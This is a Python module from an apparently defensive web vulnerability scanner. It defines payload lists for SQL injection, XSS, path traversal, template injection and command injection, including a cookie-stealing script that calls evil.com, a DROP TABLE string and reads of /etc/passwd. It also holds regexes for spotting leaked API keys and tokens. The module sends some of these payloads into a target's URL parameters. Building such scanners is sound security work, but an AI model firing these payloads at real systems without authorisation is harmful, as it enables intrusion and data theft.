from __future__ import annotations

import re
from typing import Any
from urllib.parse import urlencode, urlparse, parse_qs, urljoin

import httpx

from bugreaper.core.models import Severity, Vulnerability

SQLI_PAYLOADS = [
    "'", '"', "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
    "1' AND SLEEP(5)--", "1; DROP TABLE users--", "' UNION SELECT NULL--",
    "1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "' OR 1=1 LIMIT 1--", "admin'--", "1' ORDER BY 1--", "' AND 1=2 UNION SELECT 1,2,3--",
    "1 OR SLEEP(5)#",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>", "javascript:alert(1)",
    "<body onload=alert(1)>", "'\"><script>alert(1)</script>",
    "<iframe src=javascript:alert(1)>", "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>", "{{7*7}}", "${7*7}",
    "<script>fetch('https://evil.com/?c='+document.cookie)</script>",
    "';alert(String.fromCharCode(88,83,83))//",
]

LFI_PAYLOADS = [
    "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "/etc/passwd", "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2F..%2F..%2Fetc%2Fpasswd", "%252e%252e%252fetc%252fpasswd",
    "/proc/self/environ", "php://filter/convert.base64-encode/resource=index.php",
    "file:///etc/passwd",
]

SSTI_PAYLOADS = [
    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
    "{{config.items()}}", "{{''.__class__.__mro__[1].__subclasses__()}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}",
]

CMDI_PAYLOADS = [
    "; id", "| id", "& id", "`id`", "$(id)",
    "; sleep 5", "| sleep 5", "&& sleep 5",
    "; cat /etc/passwd", "| cat /etc/passwd",
    "; whoami", "|| whoami",
]

SECRET_PATTERNS = [
    (r"(?i)(api[_-]?key|apikey)\s*[=:]\s*['\"]?([A-Za-z0-9_\-]{20,})", "API Key"),
    (r"(?i)(secret[_-]?key|secret)\s*[=:]\s*['\"]?([A-Za-z0-9_\-]{20,})", "Secret Key"),
    (r"(?i)(password|passwd|pwd)\s*[=:]\s*['\"]?([^\s'\"]{8,})", "Password"),
    (r"(?i)(aws_access_key_id)\s*[=:]\s*['\"]?(AKIA[A-Z0-9]{16})", "AWS Access Key"),
    (r"(?i)(aws_secret_access_key)\s*[=:]\s*['\"]?([A-Za-z0-9/+=]{40})", "AWS Secret"),
    (r"(?i)(token|auth_token|access_token)\s*[=:]\s*['\"]?([A-Za-z0-9_\-\.]{20,})", "Token"),
    (r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}", "JWT Token"),
    (r"(?i)(private[_-]?key)\s*[=:]\s*['\"]?-----BEGIN", "Private Key"),
    (r"sk-[A-Za-z0-9]{48}", "OpenAI API Key"),
    (r"ghp_[A-Za-z0-9]{36}", "GitHub Personal Access Token"),
]


def _extract_params(url: str) -> list[tuple[str, str, str]]:
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    result = []
    for key, values in params.items():
        for value in values:
            result.append((key, value, url))
    return result


async def _test_injection(
    client: httpx.AsyncClient,
    url: str,
    param: str,
    original: str,
    payload: str,
    indicators: list[str],
) -> str | None:
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param] = [original + payload]
    new_query = urlencode({k: v[0] for k, v in params.items()})
    test_url = parsed._replace(query=new_query).geturl()
    try:
        resp = await client.get(test_url, timeout=10)
        body = resp.text
        for indicator in indicators:
            if indicator.lower() in body.lower():
                return test_url
        for err in ["sql syntax", "mysql_", "ora-", "pg::", "sqlite3", "warning: pg_"]:
            if err.lower() in body.lower():
                return test_url
    except Exception:
        pass
    return None


async def run(target: str, config: dict[str, Any]) -> list[Vulnerability]:
    vulns: list[Vulnerability] = []

    async with httpx.AsyncClient(verify=False, timeout=15, follow_redirects=True) as client:
        try:
            resp = await client.get(target)
            body = resp.text
        except Exception:
            return vulns

        for pattern, secret_type in SECRET_PATTERNS:
            matches = re.findall(pattern, body)
            if matches:
                vulns.append(Vulnerability(
                    title=f"Exposed Secret: {secret_type}",
                    description=f"Potential {secret_type} found in response body.",
                    severity=Severity.CRITICAL,
                    url=target,
                    evidence=str(matches[0])[:200],
                    remediation="Remove secrets from source code. Rotate all exposed credentials.",
                    scanner="pattern_engine",
                    tags=["secrets", "information-disclosure"],
                ))

        params = _extract_params(target)
        if not params:
            return vulns

        for param, original, url in params[:5]:
            for payload in SQLI_PAYLOADS[:5]:
                found = await _test_injection(
                    client, url, param, original, payload,
                    ["syntax error", "you have an error", "mysql", "ora-"],
                )
                if found:
                    vulns.append(Vulnerability(
                        title=f"SQL Injection: Parameter '{param}'",
                        description=(
                            f"SQL injection detected in parameter '{param}'. "
                            f"Payload: {payload}"
                        ),
                        severity=Severity.CRITICAL,
                        url=found,
                        parameter=param,
                        payload=payload,
                        remediation="Use parameterized queries / prepared statements.",
                        scanner="pattern_engine",
                        tags=["sqli", "injection", "owasp-a03"],
                    ))
                    break

            for payload in XSS_PAYLOADS[:5]:
                found = await _test_injection(
                    client, url, param, original, payload,
                    [payload, "<script>alert(1)</script>", "onerror=alert"],
                )
                if found:
                    vulns.append(Vulnerability(
                        title=f"Cross-Site Scripting (XSS): Parameter '{param}'",
                        description=f"Reflected XSS in parameter '{param}'. Payload: {payload}",
                        severity=Severity.HIGH,
                        url=found,
                        parameter=param,
                        payload=payload,
                        remediation="Encode all user input in HTML context. Implement CSP.",
                        scanner="pattern_engine",
                        tags=["xss", "injection", "owasp-a03"],
                    ))
                    break

    return vulns
